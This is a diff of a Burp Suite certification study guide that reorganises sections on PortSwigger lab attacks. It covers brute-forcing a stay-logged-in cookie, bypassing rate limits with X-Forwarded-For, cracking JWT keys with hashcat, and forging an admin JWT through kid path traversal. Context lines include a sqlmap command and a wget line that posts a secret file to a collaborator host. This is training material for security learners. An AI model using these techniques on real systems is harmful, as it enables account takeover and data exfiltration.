@@ -9,19 +9,19 @@
 [Web Cache Poison](#web-cache-poison)  
 [Host Header Poison](#host-header-poison---forgot-password)  
 [HTTP Request Smuggling](#http-request-smuggling)  
+[Brute force](#brute-force)  
   
 **[Privilege Escalation](#privilege-escalation)**  
-[Brute force](#brute-force)  
 [JSON roleid PrivEsc](#privesc-json-roleid)  
 [CSRF Change email or Password](#csrf-change-password-or-email)  
+[SQLi Admin Credential Exfil](#sql-injection)  
+[JSON Web Tokens](#jwt)  
   
 **[Data Exfiltration](#data-exfiltration)**  
-[SQLi Data Exfil](#sql-injection)  
 [XML entities & Injections](#xxe-injections)  
 [SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
 [SSTI Server side template injection](#ssti---server-side-template-injection)  
 [Prototype pollution](#prototype-pollution)  
-[JSON Web Tokens](#jwt)  
 [Cross Site Request Forgery](#csrf)  
 [File path traversal](#file-path-traversal)  
 [File Uploads](#file-uploads)  
@@ -725,6 +725,41 @@ Sec-Ch-Ua-Platform: "Linux"
 [PortSwigger Lab: Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)  
   
 
+## Brute Force  
+
+### Stay-Logged-in  
+
+>Login option with a stay-logged-in checkbox result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.  
+
+![stay-logged-in](images/stay-logged-in.png)  
+
+>Intruder Payload processing, add grep option and the following rules in sequenctial order before attack is submitted.  
+  
+1. Hash: MD5  
+2. Add prefix: carlos:  
+3. Encode: Base64-encode.  
+  
+```bash
+grep 'Update email'
+```  
+
+![brute](images/brute.png)  
+
+[PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
+  
+### Brute Force Protected Login  
+
+>Identified brute force protection on login when backend enforce 30 minute ban. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
+
+[Username & Password Wordlists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
+
+>Payload position 1 on IP address for ```X-Forwarded-For:``` and position 2 on username with a long password to see the response time delay in attack columns window.  
+
+![Intruder Pitchfork](images/pitchfork.png)  
+
+[PortSwigger Lab: Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)  
+  
+
 # Privilege Escalation  
   
   
@@ -757,7 +792,7 @@ Connection: close
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
 
-## CSRF Change Password or email  
+## Is Logged In  
   
 >If cookie with the **isloggedin** name is identified, then a refresh of admin password POST request could be exploited. Change username parameter to administrator while logged in as low priv user, CSRF where token is not tied to user session.  
 
@@ -796,43 +831,6 @@ csrf=TOKEN&username=administrator
 
 [PortSwigger Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)  
   
-
-## Brute Force  
-
-### Stay-Logged-in  
-
->Login option with a stay-logged-in checkbox result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.  
-
-![stay-logged-in](images/stay-logged-in.png)  
-
->Intruder Payload processing, add grep option and the following rules in sequenctial order before attack is submitted.  
-  
-1. Hash: MD5  
-2. Add prefix: carlos:  
-3. Encode: Base64-encode.  
-  
-```bash
-grep 'Update email'
-```  
-
-![brute](images/brute.png)  
-
-[PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
-  
-### Brute Force Protected Login  
-
->Identified brute force protection on login when backend enforce 30 minute ban. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  
-
-[Username & Password Wordlists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
-
->Payload position 1 on IP address for ```X-Forwarded-For:``` and position 2 on username with a long password to see the response time delay in attack columns window.  
-
-![Intruder Pitchfork](images/pitchfork.png)  
-
-[PortSwigger Lab: Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)  
-  
-
-# Data Exfiltration  
 
 ## SQL Injection  
 
@@ -929,6 +927,46 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 [PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  
 
+## JWT  
+
+>JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.  
+
+```jwt
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+```  
+
+>Brute force weak JWT signing key  
+
+```bash
+hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
+```  
+
+>JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its filesystem. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  
+
+>JWS  
+
+```
+{
+    "kid": "../../../../../../../dev/null",
+    "alg": "HS256"
+}
+```  
+
+>Payload  
+
+```
+{
+    "iss": "portswigger",
+    "sub": "administrator",
+    "exp": 1673523674
+}
+```  
+
+![jwt](images/jwt.png)  
+
+[PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  
+
+# Data Exfiltration  
 
 ## XXE Injections
 
@@ -1423,48 +1461,7 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 ![Proto pollution](images/proto-pollution.png)  
 
 >Proto pollution section is incomplete ...need more input...  
-
-## JWT  
-
->JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.  
-
-```jwt
-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-```  
-
->Brute force weak JWT signing key  
-
-```bash
-hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
-```  
-
->JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the **kid** parameter in JWT header to fetch the relevant key from its filesystem. Generate a new **Symmetric Key** and replace **k** property with base64 null byte **AA==**, to be used when signing the JWT.  
-
->JWS  
-
-```
-{
-    "kid": "../../../../../../../dev/null",
-    "alg": "HS256"
-}
-```  
-
->Payload  
-
-```
-{
-    "iss": "portswigger",
-    "sub": "administrator",
-    "exp": 1673523674
-}
-```  
-
-![jwt](images/jwt.png)  
-
-[PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  
-
->JWT section ...need more input...  
-
+  
 ## CSRF  
 
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform.  
